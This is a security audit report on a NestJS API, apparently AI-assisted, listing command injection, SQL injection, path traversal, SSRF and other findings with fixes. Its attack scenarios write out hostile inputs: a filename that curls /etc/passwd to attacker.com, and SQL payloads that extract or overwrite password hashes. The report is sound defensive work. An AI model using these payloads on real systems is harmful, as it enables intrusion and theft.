# Security Audit Report -- iMonitor API v4

**Date:** 2026-03-13
**Scope:** Full `src/` codebase with primary focus on Phase 3.7 Processing modules
**Auditor:** Security audit via Claude Opus 4.6
**Codebase:** NestJS 10.x (TypeScript), TypeORM 0.3.x, MariaDB, Redis

---

## Executive Summary

The audit identified **5 Critical**, **5 High**, **8 Medium**, and **5 Low** severity findings across the Phase 3.7 Processing modules and cross-cutting infrastructure. The most severe issues are a command injection vulnerability in the CDR decoder worker, SQL injection via second-order date format interpolation across all five `list()` methods, and missing null guards on uploaded file parameters. The codebase demonstrates generally sound security architecture (global JWT guard, privilege-based authorization, rate limiting, request filtering), but the Phase 3.7 worker thread code bypasses NestJS's DI-driven security controls and introduces several injection surfaces.

**Finding Summary:**

| Severity | Count | Exploitable Without Auth |
|----------|-------|--------------------------|
| Critical | 5     | 0                        |
| High     | 5     | 1                        |
| Medium   | 8     | 2                        |
| Low      | 5     | 0                        |

---

## Critical Findings

### C-01: OS Command Injection via `exec()` in CDR Decoder Worker

**Severity:** Critical (CVSS 9.1)
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
**File:** `src/scripts/worker/cdrDecoder.worker.ts`, line 69

**Description:**
The `originalFilePath` variable is interpolated directly into a shell command string passed to `exec()` (via `execAsync` which is `promisify(exec)`). The `originalFilePath` is constructed in `cdr-decoder.service.ts:59` from the user's uploaded filename:

```typescript
const originalFilePath = join(CDR_UPLOADS_PATH, `${processId}_${originalFileName}`);
```

While the `processId` is a UUID, `originalFileName` comes from `file.originalname` -- a client-controlled value. At line 69 of the worker:

```typescript
const command = `python3 "${scriptPath}" "${originalFilePath}"`;
await execAsync(command);
```

**Attack Scenario:**
An authenticated user uploads a file named `test$(curl attacker.com/exfil?data=$(cat /etc/passwd)).gz`. The resulting path becomes:
```
assets/cdrDecoder/uploads/uuid_test$(curl attacker.com/exfil?data=$(cat /etc/passwd)).gz
```
The double-quotes in the shell command do NOT prevent `$()` command substitution.

**Remediation:**
Replace `exec()` with `execFile()`, which does not invoke a shell and passes arguments as an array:

```typescript
import { execFile } from 'child_process';
const execFileAsync = promisify(execFile);
// ...
await execFileAsync('python3', [scriptPath, originalFilePath]);
```

Additionally, sanitize `originalFileName` before constructing the path:

```typescript
const safeOriginalName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
const originalFilePath = join(CDR_UPLOADS_PATH, `${processId}_${safeOriginalName}`);
```

---

### C-02: Second-Order SQL Injection via DATE_FORMAT Interpolation

**Severity:** Critical (CVSS 8.6)
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
**Files (all 5 `list()` methods):**
- `src/modules/bulk-processing/bulk-processing.service.ts`, lines 59-60
- `src/modules/bulk-eda-report/bulk-eda-report.service.ts`, lines 41-42
- `src/modules/cdr-decoder/cdr-decoder.service.ts`, lines 42-43
- `src/modules/bill-run/bill-run.service.ts`, lines 46-47
- `src/modules/tarrif-log/tarrif-log.service.ts`, lines 41-44

**Description:**
All five `list()` methods retrieve the `dateFormat` configuration value from `core_sys_config` and interpolate it directly into TypeORM QueryBuilder SQL:

```typescript
const dateFormat = await this.systemConfig.getConfigValue(SystemKeys.dateFormat1);
// ...
`DATE_FORMAT(p.processingDate, '${dateFormat}') AS processingDate`,
```

This is a second-order SQL injection: if an attacker (or compromised admin) modifies the `dateFormat1` value in `core_sys_config` to contain SQL, it will execute within every subsequent `list()` call. For example, setting the config value to:

```
') AS x, (SELECT passwordHash FROM core_application_users LIMIT 1) AS processingDate --
```

This would exfiltrate password hashes in the API response.

**Note:** The `DynamicTableService` in `src/shared/services/dynamic-table.service.ts` already implements `validateDateFormat()` (tagged [S-02]) with a regex allowlist. The Phase 3.7 modules do NOT use this validation.

**Remediation:**
Apply the same `validateDateFormat()` pattern from `DynamicTableService` before interpolating. Better yet, pass the format as a parameterized value where the database driver supports it, or validate against the allowlist regex:

```typescript
const VALID_DATE_FORMAT = /^[%YmdHis\-\/: .]+$/;

function validateDateFormat(format: string): string {
  if (!VALID_DATE_FORMAT.test(format)) {
    throw new BadRequestException('Invalid date format configuration');
  }
  return format;
}
```

Apply this in every `list()` method before constructing the query.

---

### C-03: Null File Upload Guard Missing on All Upload Controllers

**Severity:** Critical (CVSS 7.5)
**CWE:** CWE-476 (NULL Pointer Dereference)
**Files:**
- `src/modules/bulk-processing/bulk-processing.controller.ts`, lines 50, 70, 95
- `src/modules/bulk-eda-report/bulk-eda-report.controller.ts`, line 34
- `src/modules/cdr-decoder/cdr-decoder.controller.ts`, line 50
- `src/modules/bill-run/bill-run.controller.ts`, line 50

**Description:**
NestJS's `@UploadedFile()` decorator returns `undefined` when no file is included in the multipart request (e.g., the `document` field is missing). None of the four upload controllers validate that `file` is non-null before passing it to service methods, which then access `file.originalname`, `file.buffer`, etc.

This results in an unhandled `TypeError: Cannot read properties of undefined (reading 'originalname')`, which in non-production mode leaks the full stack trace (see C-05).

**Attack Scenario:**
Send a POST to any upload endpoint with an empty body or without the `document` field. The server crashes the request handler and returns a 500 with stack trace information.

**Remediation:**
Add a `ParseFilePipe` or explicit null check at each controller:

```typescript
import { ParseFilePipe, FileTypeValidator } from '@nestjs/common';

async decode(
  @UploadedFile(new ParseFilePipe({ validators: [] }))
  file: Express.Multer.File,
  // ...
)
```

Or add an explicit guard:

```typescript
if (!file) {
  throw new BadRequestException('File is required');
}
```

---

### C-04: Column Name Injection in Worker `updateProcess()` Helpers

**Severity:** Critical (CVSS 8.2)
**CWE:** CWE-89 (SQL Injection)
**Files:**
- `src/scripts/worker/cdrDecoder.worker.ts`, lines 34-44
- `src/scripts/worker/billRun.worker.ts`, lines 26-36

**Description:**
The `updateProcess()` function in both workers accepts a `Record<string, string | number | null>` and interpolates the object keys directly into SQL column positions:

```typescript
const fields = Object.keys(data)
  .map((k) => `${k} = ?`)
  .join(', ');
await pool.execute(`UPDATE core_decode_process SET ${fields} WHERE id = ?`, [...values, id]);
```

While the callers currently pass hardcoded field names (`status`, `finishedAt`, etc.), this pattern is dangerous because:
1. Future developers may pass user-controlled data keys.
2. The function's generic `Record<string, ...>` signature invites misuse.
3. Column names are not validated or escaped.

An attacker who can influence the keys of the `data` object could inject arbitrary SQL into the column position: `"status = 'COMPLETED', passwordHash = 'attacker_hash' WHERE 1=1 --"`.

**Remediation:**
Use an explicit allowlist of permitted column names:

```typescript
const ALLOWED_COLUMNS = new Set([
  'status', 'startedAt', 'finishedAt', 'processId',
  'recordCount', 'errorMessage', 'cdrRecordCount', 'daRecordCount',
]);

async function updateProcess(pool: mysql.Pool, id: string, data: Record<string, string | number | null>): Promise<void> {
  const entries = Object.entries(data).filter(([k]) => ALLOWED_COLUMNS.has(k));
  if (entries.length === 0) return;
  const fields = entries.map(([k]) => `\`${k}\` = ?`).join(', ');
  const values = entries.map(([, v]) => v);
  await pool.execute(`UPDATE core_decode_process SET ${fields} WHERE id = ?`, [...values, id]);
}
```

---

### C-05: Stack Trace Leakage in Non-Production Error Responses

**Severity:** Critical (CVSS 5.3)
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**File:** `src/shared/filters/global-exception.filter.ts`, lines 66-73

**Description:**
The global exception filter returns full stack traces when `NODE_ENV !== 'production'`:

```typescript
const isProd = process.env.NODE_ENV === 'production';
response.status(status).json({
  status,
  message: isProd ? 'Something went Wrong...' : err.message,
  errors: isProd ? undefined : [{ message: err.message, stack: err.stack }],
});
```

The `NODE_ENV` default in `env.validation.ts` is `'development'`. If the variable is not explicitly set in the deployment environment (a common misconfiguration), full stack traces including file paths, dependency versions, and internal logic will be exposed to attackers.

**Remediation:**
1. Default `NODE_ENV` to `'production'` in the Joi validation schema (fail-safe).
2. Never return `err.stack` to clients. Log it server-side only.
3. Consider removing the conditional entirely -- always return generic error messages to clients.

---

## High Findings

### H-01: Path Traversal in File Download Endpoints

**Severity:** High (CVSS 7.5)
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Files:**
- `src/modules/bulk-processing/bulk-processing.service.ts`, lines 237, 247
- `src/modules/bulk-eda-report/bulk-eda-report.service.ts`, lines 221, 226
- `src/modules/tarrif-log/tarrif-log.service.ts`, line 126
- `src/modules/cdr-decoder/cdr-decoder.service.ts`, line 112 (full path from DB)
- `src/modules/bill-run/bill-run.service.ts`, line 121 (full path from DB)

**Description:**
The download methods construct file paths using values from the database without validating that the resulting path stays within the expected base directory.

For `bulk-processing` and `bulk-eda-report`, the filename from the database is joined with a base path:
```typescript
return join(BULK_INPUT_PATH, process.inputFile);  // process.inputFile from DB
```

For `cdr-decoder` and `bill-run`, the full path is stored in the database and returned directly:
```typescript
const filePath = type === CDRFileType.INPUT ? record.originalFilePath : record.decodedFilePath;
return filePath;
```

If a database record is manipulated (via SQL injection or direct DB access), the stored filename could contain path traversal sequences like `../../etc/passwd`, causing `res.download()` to serve arbitrary files.

**Remediation:**
Validate that the resolved path starts with the expected base directory:

```typescript
import { resolve } from 'path';

function validateFilePath(filePath: string, baseDir: string): string {
  const resolved = resolve(filePath);
  const resolvedBase = resolve(baseDir);
  if (!resolved.startsWith(resolvedBase + '/')) {
    throw new BadRequestException('Invalid file path');
  }
  return resolved;
}
```

---

### H-02: Missing File Size Limits on Multer Uploads

**Severity:** High (CVSS 7.5)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**Files:** All controllers using `FileInterceptor('document')` without size limits

**Description:**
None of the `FileInterceptor` configurations specify a `limits.fileSize` option. The global body parser is set to 50MB (`main.ts:37`), but Multer's memory storage (the default) will buffer the entire upload into RAM before body parser limits apply. A coordinated upload of large files could exhaust server memory, causing denial of service.

Additionally, the file buffer is stored in memory (`file.buffer`) and then written to disk, meaning the same data exists in memory twice during the write operation.

**Remediation:**
Configure Multer with explicit file size limits and disk storage:

```typescript
@UseInterceptors(FileInterceptor('document', {
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
  storage: diskStorage({
    destination: './assets/uploads/tmp',
    filename: (req, file, cb) => cb(null, `${randomUUID()}${extname(file.originalname)}`),
  }),
}))
```

---

### H-03: SSRF via Configurable Tariff Process URLs

**Severity:** High (CVSS 7.3)
**CWE:** CWE-918 (Server-Side Request Forgery)
**File:** `src/modules/tarrif-log/tarrif-log.service.ts`, lines 162-173, 176-191

**Description:**
The `_triggerTarrifProcess()` and `_pullTarrifProcess()` methods construct URLs from `core_sys_config` values (`tarrifProcessUrl`, `tarrifPullProcessUrl`) and make HTTP GET requests via axios:

```typescript
const url = `${config[SystemKeys.tarrifProcessUrl]}/${id}`;
axios.get(url, { headers: { access_token: key } });
```

If these config values are modified (by an admin or via C-02), the server can be instructed to make requests to arbitrary internal services (cloud metadata endpoints, internal APIs, etc.). The `access_token` header is also sent to the attacker-controlled URL, leaking the API key.

**Remediation:**
1. Validate that the URL host is within an allowlist of known external service hosts.
2. Block private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost).
3. Do not forward authentication headers to URLs unless the host is verified.

---

### H-04: API Key Comparison Vulnerable to Timing Attack

**Severity:** High (CVSS 5.9)
**CWE:** CWE-208 (Observable Timing Discrepancy)
**File:** `src/auth/guards/api-key.guard.ts`, line 32

**Description:**
The API key comparison uses JavaScript's strict equality operator:

```typescript
if (apiKey !== storedKey) {
  throw new UnauthorizedException(ErrorMessages.API_KEY_INVALID);
}
```

String comparison with `!==` short-circuits on the first differing character, making it theoretically vulnerable to timing attacks that can progressively determine the correct key character by character.

**Remediation:**
Use a constant-time comparison:

```typescript
import { timingSafeEqual } from 'crypto';

const apiKeyBuf = Buffer.from(apiKey);
const storedKeyBuf = Buffer.from(storedKey);
if (apiKeyBuf.length !== storedKeyBuf.length || !timingSafeEqual(apiKeyBuf, storedKeyBuf)) {
  throw new UnauthorizedException(ErrorMessages.API_KEY_INVALID);
}
```

---

### H-05: Insecure Random Password Generation

**Severity:** High (CVSS 6.2)
**CWE:** CWE-330 (Use of Insufficiently Random Values)
**File:** `src/shared/helpers/common.helper.ts`, lines 42-58

**Description:**
The `generateRandomPassword()` function uses `Math.random()` for character selection and Fisher-Yates-like shuffling. `Math.random()` is not cryptographically secure -- its output can be predicted if the internal state is known, and it has insufficient entropy for security-critical operations like password generation.

```typescript
password += alpha[Math.floor(Math.random() * alpha.length)];
// ...
return password.split('').sort(() => Math.random() - 0.5).join('');
```

The `.sort(() => Math.random() - 0.5)` shuffle is also statistically biased.

**Remediation:**
Use `crypto.randomBytes()` or `crypto.randomInt()`:

```typescript
import { randomInt } from 'crypto';

export function generateRandomPassword(length = 21): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=';
  let password = '';
  for (let i = 0; i < length; i++) {
    password += chars[randomInt(chars.length)];
  }
  return password;
}
```

---

## Medium Findings

### M-01: CORS Wildcard Default Allows Any Origin

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
**File:** `src/main.ts`, lines 25-30

**Description:**
The CORS configuration defaults to `*` (all origins) when `CORS_ORIGIN` is not set:

```typescript
const corsOrigin = configService.get<string>('CORS_ORIGIN', '*');
app.enableCors({
  origin: corsOrigin === '*' ? true : corsOrigin.split(','),
  credentials: true,
});
```

Setting `origin: true` reflects the requesting origin, effectively allowing any origin. Combined with `credentials: true`, this is dangerous: browsers will send cookies/auth headers to any origin that makes a cross-origin request. This is explicitly prohibited by the CORS specification for good reason and most browsers will reject it, but older browsers may not.

**Remediation:**
Never combine wildcard/reflective origin with `credentials: true`. Require explicit `CORS_ORIGIN` in production:

```typescript
if (process.env.NODE_ENV === 'production' && corsOrigin === '*') {
  throw new Error('CORS_ORIGIN must be explicitly set in production');
}
```

---

### M-02: Bulk EDA Download Endpoint Missing Owner Authorization

**Severity:** Medium (CVSS 6.5)
**CWE:** CWE-862 (Missing Authorization)
**File:** `src/modules/bulk-eda-report/bulk-eda-report.controller.ts`, lines 38-46

**Description:**
The `download()` endpoint in `BulkEdaReportController` does not pass the current user ID to the service method:

```typescript
async download(@Param('id') id: string, @Param('type') type: string, @Res() res: Response): Promise<void> {
  const filePath = await this.bulkEdaReportService.download(id, type);
  res.download(filePath);
}
```

The service method `download()` only checks `isDeleted = 0` but does not verify that the requesting user owns the process. Compare with `cdr-decoder` and `bill-run` which correctly pass and filter by `createdBy = currentUserId`.

Similarly, the `list()` endpoint returns all processes regardless of who created them, unlike other modules that filter by `createdBy`.

**Remediation:**
Add user-based authorization to the download and list methods, consistent with other modules.

---

### M-03: Bulk Processing Download Endpoint Missing Owner Authorization

**Severity:** Medium (CVSS 6.5)
**CWE:** CWE-862 (Missing Authorization)
**File:** `src/modules/bulk-processing/bulk-processing.controller.ts`, lines 127-135

**Description:**
The `download()` endpoint does not pass `@CurrentUser('id')` to the service, and the service method does not filter by `createdBy`. Any authenticated user can download any bulk process file by guessing/enumerating process IDs.

The `list()` endpoint also does not filter by the current user (though it accepts `userId`, it passes it through unused in some code paths).

**Remediation:**
Add `@CurrentUser('id')` parameter to the download controller method and filter by `createdBy` in the service query.

---

### M-04: Tariff Download Endpoint Missing Owner Authorization

**Severity:** Medium (CVSS 6.5)
**CWE:** CWE-862 (Missing Authorization)
**File:** `src/modules/tarrif-log/tarrif-log.controller.ts`, lines 45-52

**Description:**
The `download()` endpoint does not pass the current user ID:

```typescript
async download(@Param('id') id: string, @Res() res: Response): Promise<void> {
  const filePath = await this.tarrifLogService.download(id);
  res.download(filePath);
}
```

The service only checks `exists` by ID, not ownership. The `list()` endpoint also returns all tariff processes for all users.

---

### M-05: Worker Database Pools Created Without TLS or Connection Encryption

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
**Files:**
- `src/scripts/worker/cdrDecoder.worker.ts`, lines 23-31
- `src/scripts/worker/bulkProcess.worker.ts`, lines 22-29
- `src/scripts/worker/billRun.worker.ts`, lines 15-24

**Description:**
All three worker scripts create their own mysql2 connection pools (bypassing NestJS DI). None configure TLS:

```typescript
return mysql.createPool({
  host: process.env.DB_HOST,
  port: Number(process.env.DB_PORT ?? 3306),
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: 'iMonitorV3_1',
  connectionLimit: 2,
});
```

Database credentials and query results are transmitted in cleartext if the database is on a different host.

**Remediation:**
Add TLS configuration consistent with the main application's database connection:

```typescript
ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: true } : undefined,
```

---

### M-06: Hardcoded Database Name in Workers

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**Files:**
- `src/scripts/worker/cdrDecoder.worker.ts`, line 29 (`'iMonitorV3_1'`)
- `src/scripts/worker/billRun.worker.ts`, line 22 (`'iMonitorV3_1'`)

**Description:**
Two of three workers hardcode the database name `'iMonitorV3_1'` instead of reading from the `coreDbName` environment variable. The `bulkProcess.worker.ts` correctly uses `process.env.coreDbName ?? 'iMonitorV3_1'`. This inconsistency could cause workers to connect to the wrong database in environments using different database names.

---

### M-07: Redis Port Exposed Without Authentication in Docker Compose

**Severity:** Medium (CVSS 5.3)
**CWE:** CWE-284 (Improper Access Control)
**File:** `docker-compose.yml`, lines 31-36

**Description:**
The Redis service exposes port 8005 to the host with a default password of `changeme`:

```yaml
ports:
  - '8005:6379'
command: redis-server --requirepass ${REDIS_PASSWORD:-changeme}
```

If deployed without changing `REDIS_PASSWORD`, anyone with network access to port 8005 can access Redis. The rate limiter data, cached configs, and potentially session data stored in Redis would be compromised.

**Remediation:**
1. Remove the port mapping or bind to `127.0.0.1:8005:6379`.
2. Remove the default password fallback -- require explicit configuration.
3. Add `REDIS_PASSWORD` to the required env validation schema.

---

### M-08: `bulkChargingCsv()` Missing File Extension Validation

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
**File:** `src/modules/bulk-processing/bulk-processing.service.ts`, lines 253-270

**Description:**
The `bulkChargingCsv()` method writes the uploaded file directly to disk without validating the file extension or content type:

```typescript
async bulkChargingCsv(file: Express.Multer.File): Promise<void> {
  const processId = generateGuid();
  const fileName = `${processId}.csv`;
  const filePath = join(BULK_INPUT_PATH, fileName);
  await fsPromise.writeFile(filePath, file.buffer as Uint8Array);
  // ...
}
```

While the `add()` and `schedule()` methods validate `ext !== 'csv'`, this method does not. An attacker could upload any file type which is then stored on disk (though renamed to `.csv`).

---

## Low Findings

### L-01: Swagger UI Enabled by Default in All Environments

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-16 (Configuration)
**File:** `src/main.ts`, lines 41-54

**Description:**
Swagger UI is enabled by default (`SWAGGER_ENABLED` defaults to `'true'`). In production, this exposes the full API documentation, including all endpoint paths, request/response schemas, and parameter types, making reconnaissance trivial.

**Remediation:**
Default to disabled and require explicit opt-in:

```typescript
const swaggerEnabled = configService.get<string>('SWAGGER_ENABLED', 'false') === 'true';
```

---

### L-02: 50MB Body Parser Limit

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-770 (Allocation of Resources Without Limits)
**File:** `src/main.ts`, lines 36-38

**Description:**
The JSON body parser accepts payloads up to 50MB. This is excessively large for most API operations and could contribute to memory exhaustion attacks, especially under the cluster mode where each worker has this limit independently.

**Remediation:**
Reduce the default limit to a reasonable value (e.g., 1MB) and configure higher limits only on specific routes that need them.

---

### L-03: Puppeteer/Chromium in Production Container Increases Attack Surface

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
**File:** `Dockerfile`, lines 30-36

**Description:**
The production Docker image includes a full Chromium browser installation for PDF generation. Chromium has a large attack surface and regularly receives critical security patches. The container must be rebuilt frequently to stay current with Chromium security updates.

**Remediation:**
Consider isolating PDF generation into a separate microservice or using a headless browser service, reducing the main API container's attack surface.

---

### L-04: Worker Thread Error Messages May Leak Internal Paths

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-209 (Information Exposure Through Error Messages)
**Files:**
- `src/scripts/worker/cdrDecoder.worker.ts`, line 85
- `src/scripts/worker/billRun.worker.ts`, line 92

**Description:**
Worker error messages are stored directly in the database (`errorMessage` column) from `error.message`, which may contain full file paths, database connection strings, or other internal details. These error messages are then returned to authenticated users via the `list()` API endpoints.

---

### L-05: No CSRF Protection on State-Changing Endpoints

**Severity:** Low (CVSS 3.5)
**CWE:** CWE-352 (Cross-Site Request Forgery)
**File:** Cross-cutting concern

**Description:**
The API relies on Bearer token authentication, which is inherently resistant to CSRF when tokens are stored in JavaScript memory. However, if tokens are stored in cookies (e.g., for `keepLogin` functionality), the lack of CSRF protection could be exploitable. The `SameSite` cookie attribute and CSRF tokens are not configured.

---

## Positive Security Controls Observed

The following security measures are already well-implemented:

1. **Global JWT authentication** -- `JwtAuthGuard` as `APP_GUARD` ensures all non-`@Public()` routes require valid JWT tokens.

2. **HS256 with enforced minimum key length** -- JWT is configured with explicit `algorithms: ['HS256']` verification and the env validation schema requires `JWT_KEY` to be at least 32 characters.

3. **Privilege-based authorization** -- `PrivilegeGuard` implements hierarchical role checks cached at startup (PC-02), preventing N+1 DB queries per request.

4. **Request filter middleware** -- `RequestFilterMiddleware` detects directory traversal patterns and CGI probing attempts, logging them to the database.

5. **Rate limiting** -- Dual-layer Redis + in-memory rate limiter with configurable thresholds and IP logging.

6. **Refresh token rotation** -- Proper one-time-use refresh tokens with `used`/`invalidated` flags, expiry validation, and `jwtId` linkage (H-02 fix).

7. **30-day keepLogin cap** -- `SC-01` security fix prevents indefinite token lifetime for persistent sessions.

8. **Password hashing** -- bcrypt with 10 salt rounds.

9. **Helmet security headers** -- Applied globally via middleware.

10. **Non-root Docker user** -- Production container runs as `appuser`.

11. **Identifier sanitization in DynamicTableService** -- `sanitizeIdentifier()` [S-01] and `validateDateFormat()` [S-02] prevent injection in the Parameters/NodeDefinition modules.

12. **Encrypted field handling** -- AES encryption via `field.isEncrypted` flag rather than column name heuristics [S-10].

---

## Dependency Analysis

| Package | Version | Known Vulnerabilities | Notes |
|---------|---------|----------------------|-------|
| `jsonwebtoken` | ^9.0.3 | None current | Consider removing -- `@nestjs/jwt` already wraps it |
| `axios` | ^1.13.6 | None current | Used for tariff HTTP triggers |
| `mysql2` | ^3.6.3 | Check for latest patches | Used in workers outside NestJS DI |
| `puppeteer` | ^24.37.5 | Frequent Chromium CVEs | Must track Chromium security releases |
| `fast-xml-parser` | ^5.5.3 | Historical XXE issues in earlier versions | Current version is safe |
| `bcrypt` | ^6.0.0 | None current | Appropriate for password hashing |

**Recommendation:** Run `npm audit` regularly and integrate `npm audit --audit-level=high` into the CI/CD pipeline.

---

## Recommendations Summary (Priority Order)

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | C-01: Replace `exec()` with `execFile()` in CDR worker | Low | Eliminates RCE |
| 2 | C-02: Add `validateDateFormat()` to all 5 `list()` methods | Low | Eliminates SQLi |
| 3 | C-03: Add null file guards to all 4 upload controllers | Low | Prevents crashes |
| 4 | C-04: Add column name allowlist to worker `updateProcess()` | Low | Eliminates SQLi |
| 5 | H-01: Add path traversal validation to all download methods | Low | Prevents file read |
| 6 | H-02: Add Multer file size limits | Low | Prevents DoS |
| 7 | M-02/M-03/M-04: Add owner authorization to download/list endpoints | Medium | Prevents IDOR |
| 8 | C-05: Never return stack traces to clients | Low | Prevents info leak |
| 9 | H-04: Use `timingSafeEqual` for API key comparison | Low | Prevents timing attack |
| 10 | H-05: Replace `Math.random()` with `crypto.randomInt()` | Low | Stronger passwords |
| 11 | M-01: Require explicit CORS origin in production | Low | Prevents CSRF-like |
| 12 | H-03: Validate tariff process URLs against allowlist | Medium | Prevents SSRF |
| 13 | M-07: Secure Redis in Docker Compose | Low | Prevents data exposure |
| 14 | M-05: Add TLS to worker DB connections | Medium | Encrypts DB traffic |

---

*End of report. Total findings: 23 (5 Critical, 5 High, 8 Medium, 5 Low).*
